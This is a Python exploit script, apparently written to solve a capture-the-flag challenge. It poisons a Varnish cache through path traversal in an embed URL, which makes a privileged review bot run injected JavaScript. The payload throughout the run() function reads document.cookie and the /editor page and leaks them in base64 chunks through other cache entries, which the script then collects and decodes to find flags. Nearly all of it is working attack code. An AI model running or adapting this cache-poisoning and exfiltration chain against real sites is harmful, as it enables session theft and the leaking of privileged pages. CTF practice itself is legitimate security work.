#!/usr/bin/env python
"""9165 Lane I - ticker cache poisoning -> JS in the duty editor -> /editor exfil.

Usage: python laneI/pwn.py [zone]

Chain:
  1. create+publish a notice (a zone needs a published notice for /review to accept it)
  2. GET /z/<zone> -> 12-hex embed token
  3. POST /review zone=<zone>
  4. keep poisoning  GET /z/<zone>/embed/<T>/../../ticker.js?html=<js>
     (Varnish keys it as /z/<zone>/ticker.js, forces application/javascript, ignores no-store)
     re-poison every ~12.6 s until the duty-log row appears (bot page load is 10-32 s out)
  5. the bot's board <script src="/z/<zone>/ticker.js"> executes our JS, which XHRs /editor
     (privileged because the bot is 127.0.0.1) and beacons base64 chunks into /z/<slot>/ticker.js
  6. read the slots back within their ~12 s TTL and decode
"""
import sys, re, time, json, base64, threading, urllib.parse, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from h import req

def post(path, fields=None, cookie=None):
    body = urllib.parse.urlencode(fields or {}).encode()
    hh = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie: hh["Cookie"] = cookie
    return req(path, headers=hh, method=b"POST", body=body)

def run(Z=None, quiet=False):
    Z = Z or ("ipw%05d" % (int(time.time()) % 100000))
    pfx = "i%05d" % (int(time.time()) % 100000)
    PING, MET, ERR, EX = pfx + "p", pfx + "m", pfx + "e", pfx + "x"
    read_slots = [PING, MET, ERR] + [EX + str(i) for i in range(0, 30)]

    js = ("(function(){function s(v,n){try{new Image().src='/z/'+n+'/ticker.js?text='+"
          "encodeURIComponent(String(v).slice(0,460))}catch(e){}}"
          "s('PING','" + PING + "');"
          "s('CK='+document.cookie+'|U='+location.href,'" + MET + "');"
          "try{var x=new XMLHttpRequest();x.open('GET','/editor',true);"
          "x.onload=function(){var t=x.responseText;s('EDLEN='+t.length,'" + EX + "0');"
          "try{var b=btoa(unescape(encodeURIComponent(t)));"
          "for(var i=0;i*330<b.length;i++){s(b.slice(i*330,(i+1)*330),'" + EX + "'+(i+1));}}"
          "catch(e){s('B64ERR'+e,'" + ERR + "')}};"
          "x.onerror=function(){s('EDERR','" + ERR + "')};x.send()}"
          "catch(e){s('EX'+e,'" + ERR + "')}})();")

    st, h, b = post("/draft", {"zone": Z, "author": "laneI", "title": "probe", "body": "p"})
    loc = h.get("location")
    post(loc + "/publish", cookie="desk=laneI")
    st, h, b = req("/z/" + Z)
    m = re.search(rb'/z/' + Z.encode() + rb'/embed/([0-9a-f]{8,})', b)
    if not m:
        print("no embed token for", Z); return None
    T = m.group(1).decode()
    poison_url = "/z/%s/embed/%s/../../ticker.js?html=%s" % (Z, T, urllib.parse.quote(js, safe=""))

    st, h, b = post("/review", {"zone": Z})
    if st.split(" ")[1] != "200" or b"Sent" not in b:
        print("review rejected:", st); return None
    t0 = time.time(); stop = threading.Event()
    def keeper():
        n = 0
        while not stop.is_set():
            st, h, b = req(poison_url)
            if not quiet:
                print("  poison[%d] %s %s len=%d" % (n, st.split(" ")[1], h.get("x-cache"), len(b)), flush=True)
            n += 1
            for _ in range(126):
                if stop.is_set(): return
                time.sleep(0.1)
    threading.Thread(target=keeper, daemon=True).start()

    row = None
    while time.time() - t0 < 70:
        time.sleep(0.25)
        st, h, b = req("/review")
        rows = re.findall(r"<tr>(.*?)</tr>", b.decode("utf-8", "replace"), re.S)
        if len(rows) >= 2 and Z in rows[1]:
            row = time.time() - t0; break
    stop.set(); time.sleep(0.2)
    if not quiet:
        print("row at t+%s" % (("%.1fs" % row) if row else "MISSING"))

    data = {}
    for sl in read_slots:
        st, h, b = req("/z/%s/ticker.js" % sl)
        m = re.match(rb'var el = document\.getElementById\("ticker"\);\nif \(el\) \{ el\.textContent = ("(?:[^"\\]|\\.)*"); \}\n', b, re.S)
        if m:
            try: v = json.loads(m.group(1).decode())
            except Exception: v = m.group(1).decode()
            if v != "No notices yet": data[sl] = v
    out = {"zone": Z, "row_s": row, "slots": data}
    b64 = "".join(data.get(EX + str(i), "") for i in range(1, 30))
    if b64:
        try: out["editor_html"] = base64.b64decode(b64 + "=" * ((-len(b64)) % 4)).decode("utf-8", "replace")
        except Exception as e: out["editor_html"] = "DECODE_ERR %s" % e
    if out.get("editor_html"):
        out["flags"] = re.findall(r"CSCTF\{[^}]+\}", out["editor_html"])
    return out

if __name__ == "__main__":
    r = run(sys.argv[1] if len(sys.argv) > 1 else None)
    print(json.dumps({k: v for k, v in (r or {}).items() if k != "editor_html"}, indent=1))
    if r and r.get("editor_html"):
        print(r["editor_html"][:1200])
